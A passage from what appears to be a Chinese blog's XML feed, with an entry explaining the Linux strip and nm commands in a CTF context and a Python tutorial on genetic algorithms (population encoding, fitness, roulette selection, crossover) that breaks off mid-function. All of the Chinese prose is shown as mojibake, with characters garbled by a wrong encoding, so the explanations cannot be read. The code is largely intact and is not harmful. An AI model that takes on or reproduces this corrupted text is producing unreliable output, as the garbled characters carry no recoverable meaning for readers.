            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ17-strip</title>
      <link href="/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
      <url>/2018/10/17/Pwn-10%E6%9C%8817-strip/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ17-strip"><a href="#Pwn-10æœˆ17-strip" class="headerlink" title="Pwn-10æœˆ17-strip"></a>Pwn-10æœˆ17-strip</h1><blockquote><p>stripæ˜¯linuxä¸‹çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºç»™ç‰¹å®šæ–‡ä»¶æ¶ˆé™¤ï¼Œå‰¥ç¦»ä¸€äº›ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œé€šå¸¸è¢«å«åšâ€œè„±è¡£æœâ€ï¼Œå¯ä»¥å‡å°å¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯ï¼Œåˆä¸å½±å“å…¶è¿è¡Œï¼Œä½†æ˜¯å½“è¿™ç§ç¨‹åºå‡ºç°åœ¨äºŒè¿›åˆ¶åˆ†æä¸­å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œå› ä¸ºç”¨stripå‘½ä»¤å¤„ç†è¿‡çš„ç¨‹åºï¼Œåç¼–è¯‘å¯èƒ½ä¼šæ¯”è¾ƒæ··ä¹±ï¼Œæœ‰æ—¶å€™ä¹Ÿéœ€è¦æ¢å¤ç¬¦å·è¡¨æ¥å®Œæˆåˆ†æã€‚</p><p>ç®€å•ç¼–è¯‘ä¸€ä¸ªtest.cæ–‡ä»¶ï¼Œè„±è„±è¡£æœè¯•è¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç¼–è¯‘åçš„testæ–‡ä»¶ä¿¡æ¯ï¼Œnot strippedï¼Œè¿™é‡Œå†ç”¨åˆ°linuxä¸‹çš„nmå‘½ä»¤ï¼Œæ˜¯namesçš„ç¼©å†™ï¼Œèƒ½å¤Ÿåˆ—å‡ºæ–‡ä»¶çš„ç¬¦å·å€¼ï¼Œå‡½æ•°å’Œå…¨å±€å˜é‡ç­‰ä¿¡æ¯ï¼Œæ›´å®˜æ–¹ä¸€ç‚¹çš„å°±æ˜¯è¿™æ ·çš„è§£é‡Šï¼š<code>nmå·¥å…·åˆ—å‡º.oæ–‡ä»¶ã€.aæ–‡ä»¶ã€.soæ–‡ä»¶ç­‰çš„ç¬¦å·ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯¸å¦‚ç¬¦å·çš„å€¼ï¼Œç¬¦å·ç±»å‹åŠç¬¦å·åç§°ç­‰ã€‚æ‰€è°“ç¬¦å·ï¼Œé€šå¸¸æŒ‡å®šä¹‰å‡ºçš„å‡½æ•°ï¼Œå…¨å±€å˜é‡ç­‰ç­‰ã€‚</code>ã€‚</p><p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p><p>åƒ hacklu2018çš„ä¸€ä¸ªé¢˜ï¼Œå°±æ˜¯è„±äº†è¡£æœçš„ï¼Œæ²¡æœ‰ç¬¦å·è¡¨ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p><p>é‚£ä¹ˆç»™testæ–‡ä»¶è„±ä¸€ä¸‹è¯•è¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç¬¦å·è¡¨å·²ç»è¢«è„±ä¸‹ï¼Œå¹¶ä¸”ä¸å½±å“æ­£å¸¸è¿è¡Œã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>é—ä¼ ç®—æ³•</title>
      <link href="/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/"/>
      <url>/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰"><a href="#é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰" class="headerlink" title="é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰"></a>é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰</h1><blockquote><p>ç®—æ³•éƒ½æ˜¯ç”¨æ¥è§£å†³å®é™…é—®é¢˜ï¼Œæé«˜æ•ˆç‡çš„ï¼Œè€Œå­¦å¥½ç®—æ³•å¯¹ä¸€ä¸ªä¿¡æ¯å®‰å…¨ä»ä¸šè€…æ¥è¯´ï¼Œåº”è¯¥ä¹Ÿæ˜¯å¿…è¦çš„ã€‚å¼€å§‹æ¥è§¦è¿™äº›ç®—æ³•ï¼Œä¹Ÿé€æ¸æ„è¯†åˆ°çŸ¥è¯†é¢å¹¿é˜”çš„é‡è¦ï¼Œæ¯”å¦‚é—ä¼ ç®—æ³•å°±éœ€è¦çŸ¥é“ä¸€å®šçš„ç”Ÿç‰©çŸ¥è¯†ï¼Œå¯èƒ½è¿™å°±æ˜¯åŸ¹è®­æœºæ„æ— æ³•å¼¥è¡¥çš„åœ°æ–¹å§ã€‚</p></blockquote><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å…ˆå¼•ç”¨ä¸€ä¸‹é—ä¼ ç®—æ³•çš„è§£é‡Šï¼š</p><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰</strong>æ˜¯æ¨¡æ‹Ÿè¾¾å°”æ–‡ç”Ÿç‰©è¿›åŒ–è®ºçš„è‡ªç„¶é€‰æ‹©å’Œé—ä¼ å­¦æœºç†çš„ç”Ÿç‰©è¿›åŒ–è¿‡ç¨‹çš„è®¡ç®—æ¨¡å‹ï¼Œæ˜¯ä¸€ç§é€šè¿‡æ¨¡æ‹Ÿè‡ªç„¶è¿›åŒ–è¿‡ç¨‹æœç´¢æœ€ä¼˜è§£çš„æ–¹æ³•ã€‚é—ä¼ ç®—æ³•æ˜¯ä»ä»£è¡¨é—®é¢˜å¯èƒ½æ½œåœ¨çš„è§£é›†çš„ä¸€ä¸ª<strong>ç§ç¾¤ï¼ˆpopulationï¼‰</strong>å¼€å§‹çš„ï¼Œè€Œä¸€ä¸ªç§ç¾¤åˆ™ç”±ç»è¿‡<strong>åŸºå› ï¼ˆgeneï¼‰</strong>ç¼–ç çš„ä¸€å®šæ•°ç›®çš„<strong>ä¸ªä½“(individual)</strong>ç»„æˆã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; æ¯ä¸ªä¸ªä½“å®é™…ä¸Šæ˜¯<strong>æŸ“è‰²ä½“(chromosome)</strong>å¸¦æœ‰ç‰¹å¾çš„å®ä½“ã€‚æŸ“è‰²ä½“ä½œä¸ºé—ä¼ ç‰©è´¨çš„ä¸»è¦è½½ä½“ï¼Œå³å¤šä¸ªåŸºå› çš„é›†åˆï¼Œå…¶å†…éƒ¨è¡¨ç°ï¼ˆå³åŸºå› å‹ï¼‰æ˜¯æŸç§åŸºå› ç»„åˆï¼Œå®ƒå†³å®šäº†ä¸ªä½“çš„å½¢çŠ¶çš„å¤–éƒ¨è¡¨ç°ï¼Œå¦‚é»‘å¤´å‘çš„ç‰¹å¾æ˜¯ç”±æŸ“è‰²ä½“ä¸­æ§åˆ¶è¿™ä¸€ç‰¹å¾çš„æŸç§åŸºå› ç»„åˆå†³å®šçš„ã€‚å› æ­¤ï¼Œåœ¨ä¸€å¼€å§‹éœ€è¦å®ç°ä»è¡¨ç°å‹åˆ°åŸºå› å‹çš„æ˜ å°„å³ç¼–ç å·¥ä½œã€‚ç”±äºä»¿ç…§åŸºå› ç¼–ç çš„å·¥ä½œå¾ˆå¤æ‚ï¼Œæˆ‘ä»¬å¾€å¾€è¿›è¡Œç®€åŒ–ï¼Œå¦‚<strong>äºŒè¿›åˆ¶ç¼–ç </strong>ï¼Œåˆä»£ç§ç¾¤äº§ç”Ÿä¹‹åï¼ŒæŒ‰ç…§é€‚è€…ç”Ÿå­˜å’Œä¼˜èƒœåŠ£æ±°çš„åŸç†ï¼Œ<strong>é€ä»£ï¼ˆgenerationï¼‰</strong>æ¼”åŒ–äº§ç”Ÿå‡ºè¶Šæ¥è¶Šå¥½çš„è¿‘ä¼¼è§£ï¼Œåœ¨æ¯ä¸€ä»£ï¼Œæ ¹æ®é—®é¢˜åŸŸä¸­ä¸ªä½“çš„<strong>é€‚åº”åº¦ï¼ˆfitnessï¼‰</strong>å¤§å°<strong>é€‰æ‹©ï¼ˆselectionï¼‰</strong>ä¸ªä½“ï¼Œå¹¶å€ŸåŠ©äº<strong>è‡ªç„¶é—ä¼ å­¦çš„é—ä¼ ç®—å­ï¼ˆgenetic operatorsï¼‰</strong>è¿›è¡Œ<strong>ç»„åˆäº¤å‰ï¼ˆcrossoverï¼‰å’Œå˜å¼‚ï¼ˆmutationï¼‰</strong>ï¼Œäº§ç”Ÿå‡ºä»£è¡¨æ–°çš„è§£é›†çš„ç§ç¾¤ã€‚è¿™ä¸ªè¿‡ç¨‹å°†å¯¼è‡´ç§ç¾¤åƒ<strong>è‡ªç„¶è¿›åŒ–</strong>ä¸€æ ·çš„åç”Ÿä»£ç§ç¾¤æ¯”å‰ä»£æ›´åŠ é€‚åº”äºç¯å¢ƒï¼Œæœ«ä»£ç§ç¾¤ä¸­çš„æœ€ä¼˜ä¸ªä½“ç»è¿‡<strong>è§£ç ï¼ˆdecodingï¼‰</strong>ï¼Œå¯ä»¥ä½œä¸ºé—®é¢˜è¿‘ä¼¼æœ€ä¼˜è§£ã€‚</p><p>é—ä¼ ç®—æ³•çš„ç»„æˆä¸»è¦åŒ…æ‹¬4ä¸ªéƒ¨åˆ†ï¼š<br>ï¼ˆ1ï¼‰ç¼–ç <br>ï¼ˆ2ï¼‰é€‚åº”åº¦å‡½æ•°<br>ï¼ˆ3ï¼‰é—ä¼ ç®—å­ï¼ˆé€‰æ‹©ï¼Œäº¤å‰ï¼Œå˜å¼‚ï¼‰<br>ï¼ˆ4ï¼‰è¿è¡Œå‚æ•° </p><p><strong>é€‰æ‹©ã€äº¤å‰å’Œå˜å¼‚</strong>æ„æˆäº†é—ä¼ ç®—æ³•çš„é—ä¼ æ“ä½œï¼›<strong>å‚æ•°ç¼–ç ã€åˆå§‹ç¾¤ä½“çš„è®¾å®šã€é€‚åº”åº¦å‡½æ•°çš„è®¾è®¡ã€é—ä¼ æ“ä½œè®¾è®¡ã€æ§åˆ¶å‚æ•°</strong>è®¾å®šäº”ä¸ªè¦ç´ ç»„æˆäº†é—ä¼ ç®—æ³•çš„æ ¸å¿ƒå†…å®¹ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018083211.png" alt=""></p></blockquote><h2 id="ç¼–ç ä¸è§£ç "><a href="#ç¼–ç ä¸è§£ç " class="headerlink" title="ç¼–ç ä¸è§£ç "></a>ç¼–ç ä¸è§£ç </h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; é—ä¼ ç®—æ³•çš„å®è¡Œï¼Œé¦–å…ˆéœ€è¦ç¡®å®šç¼–ç å’Œè§£ç çš„å½¢å¼ï¼Œç”Ÿç‰©ä½“çš„é—ä¼ å°±æ˜¯é€šè¿‡æŸ“è‰²ä½“ä»¥åŠåŸºå› è¿›è¡Œï¼Œç¼–ç å½¢å¼å¤šç§å¤šæ ·ï¼Œèƒ½å¤Ÿä½¿ç”¨å­—æ¯ï¼Œå®æ•°ï¼Œæˆ–è€…æ˜¯äºŒè¿›åˆ¶æ¥è¿›è¡Œç¼–ç ã€‚ä½†æ˜¯å› ä¸ºåšä¸»åˆšå¼€å§‹å­¦é—ä¼ ç®—æ³•ï¼Œä¾¿æ‹¿SGAï¼ˆåŸºæœ¬é—ä¼ ç®—æ³•ï¼‰æ¥å¯¹é—ä¼ ç®—æ³•è¿›è¡Œä¸€ä¸ªç®€å•çš„ç†è§£ã€‚</p><p>ç›´æ¥ä¸Šä¾‹é¢˜è¯´æ˜ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018095823.png" alt=""></p><p>æˆ‘ä»¬éœ€è¦æ±‚æ­¤å‡½æ•°åœ¨[-2,2]åŒºé—´ä¸‹çš„æœ€å¤§å€¼ï¼Œå…ˆç”¨pythonç”»ä¸€ä¸‹å‡½æ•°å›¾å½¢ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#é€šè¿‡matplotlibåº“ç»˜å‡ºå‡½æ•°å›¾å½¢</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'local max'</span><span class="token punctuation">,</span> xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.4</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            arrowprops<span class="token operator">=</span>dict<span class="token punctuation">(</span>facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> shrink<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å‡½æ•°å›¾åƒå¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018183218.png" alt=""></p><p>[-2,2]åŒºé—´å·²ç»åˆ†ä¸º10000ä¸ªç­‰ä»½ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºæœ€å¤§å€¼ï¼ŒSGAåŸºæœ¬é—ä¼ ç®—æ³•å°±æ˜¯ç”¨äºŒè¿›åˆ¶ç¼–ç æ¥è¡¨ç¤ºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠ2^14ï¼Œå³åå››ä½äºŒè¿›åˆ¶ç”¨ä½œç¼–ç æ¥è¡¨ç¤ºä¸ªä½“ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105024.png" alt=""></p></blockquote><h2 id="åˆå§‹åŒ–ç§ç¾¤"><a href="#åˆå§‹åŒ–ç§ç¾¤" class="headerlink" title="åˆå§‹åŒ–ç§ç¾¤"></a>åˆå§‹åŒ–ç§ç¾¤</h2><blockquote><p>å·²ç»å†³å®šç”¨åå››ä½äºŒè¿›åˆ¶æ¥è¡¨ç¤ºç§ç¾¤ä¸ªä½“äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹ç§ç¾¤è¿›è¡Œåˆå§‹åŒ–ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#åˆå§‹åŒ–ç§ç¾¤ä¸ªä½“</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>       <span class="token comment" spellcheck="true">#éšæœºäº§ç”Ÿä¸ªä½“</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population</code></pre><p>å°†ç§ç¾¤åˆå§‹åŒ–ç¼–ç åï¼Œè‡ªå®šä¹‰è§£ç æ–¹æ³•ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#è§£ç </span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>   flag <span class="token operator">=</span> <span class="token number">0</span>   Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#print(population)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºæ•´å‹æ•°å€¼</span>       x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>       x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>       Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>       <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>   <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation   <span class="token comment" spellcheck="true">#return express</span>   <span class="token comment" spellcheck="true"># print(bx[0:100])</span>   <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span></code></pre></blockquote><h2 id="è®¡ç®—é€‚åº”åº¦"><a href="#è®¡ç®—é€‚åº”åº¦" class="headerlink" title="è®¡ç®—é€‚åº”åº¦"></a>è®¡ç®—é€‚åº”åº¦</h2><blockquote><p>æ ¹æ®ç§ç¾¤ä¸ªä½“çš„é€‚åº”åº¦æˆ‘ä»¬å¯ä»¥è¿›è¡Œåé¢çš„é€‰æ‹©æ·˜æ±°æ–¹æ³•ï¼Œä¸åŒçš„é—®é¢˜æœ‰ä¸åŒçš„é€‚åº”åº¦è®¡ç®—æ–¹æ³•<br> è€Œæœ¬ä¾‹é¢˜åˆ™ï¼Œç›´æ¥ç”¨ç›®æ ‡å‡½æ•°ä½œä¸ºé€‚åº”åº¦å‡½æ•°</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#æ ¹æ®å‡½æ•°åŸå‹è®¡ç®—è¡¨ç°å‹ï¼ˆyå€¼)ï¼Œå³é€‚åº”åº¦</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#é€šè¿‡å¾ªç¯è®¡ç®—æ¯ä¸€ä¸ªxå€¼å¯¹åº”çš„yå€¼</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ç”±äºæ˜¯è®¡ç®—æœ€å¤§å€¼ï¼Œè‹¥å­˜åœ¨æ­£æ•°åˆ™ç›´æ¥å»é™¤è´Ÿæ•°ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population</code></pre></blockquote><h2 id="å®šä¹‰é€‰æ‹©æ–¹æ³•"><a href="#å®šä¹‰é€‰æ‹©æ–¹æ³•" class="headerlink" title="å®šä¹‰é€‰æ‹©æ–¹æ³•"></a>å®šä¹‰é€‰æ‹©æ–¹æ³•</h2><blockquote><p>ä¸ªä½“ç”Ÿå­˜æ¦‚ç‡å…¬å¼ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105143.png" alt=""></p></blockquote><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018145013.png" class="lazyload"></p><p>æ ¹æ®é€‚åº”åº¦ä»¥åŠé—ä¼ æ¦‚ç‡ï¼Œè¿›è¡Œé€‰æ‹©ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#å®šä¹‰ç‰©ç«å¤©æ‹©,å¼±è€…æ·˜æ±°</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#è½®ç›˜èµŒé€‰æ‹©,æŸ“è‰²ä½“ç´¯è®¡æ¦‚ç‡</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#è¿›è¡Œé€‰æ‹©ï¼Œæ·˜æ±°å¼±è€…ï¼Œè·å–æ–°ç§ç¾¤</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ç•™ä¸‹ä¼˜ç§€ä¸ªä½“</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span></code></pre></blockquote><h2 id="å®šä¹‰äº¤å‰æ–¹æ³•"><a href="#å®šä¹‰äº¤å‰æ–¹æ³•" class="headerlink" title="å®šä¹‰äº¤å‰æ–¹æ³•"></a>å®šä¹‰äº¤å‰æ–¹æ³•</h2><blockquote><p>åƒæŸ“è‰²ä½“ä¸€æ ·ï¼Œä¹Ÿè¿›è¡Œäº¤å‰æ“ä½œï¼Œå¹¶ä¸”ç»™ä¸äº¤å‰æ“ä½œäº§ç”Ÿçš„æ¦‚ç‡ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#äº¤å‰ç®—å­</span><span class="token comment" spellcheck="true">#population_newä¸ºé€‰æ‹©ä¸‹æ¥çš„ç§ç¾¤ï¼Œpcä¸ºäº¤å‰æ¦‚ç‡</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token 